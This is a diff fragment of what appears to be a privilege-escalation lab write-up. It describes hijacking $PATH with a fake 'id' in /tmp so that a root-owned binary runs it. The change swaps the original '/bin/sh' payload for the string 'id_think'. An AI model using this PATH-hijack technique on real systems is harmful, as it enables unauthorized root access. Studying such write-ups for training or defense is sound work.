@@ -77,7 +77,7 @@ Ran `linpeas.sh` → found process `pwn` running as root.
 
 Binary reads `$PATH`. Exploit with fake `id`:  
 ```bash
-echo "/bin/sh" > /tmp/id
+echo "id_think" > /tmp/id
 chmod +x /tmp/id
 export PATH=/tmp:$PATH
 ```
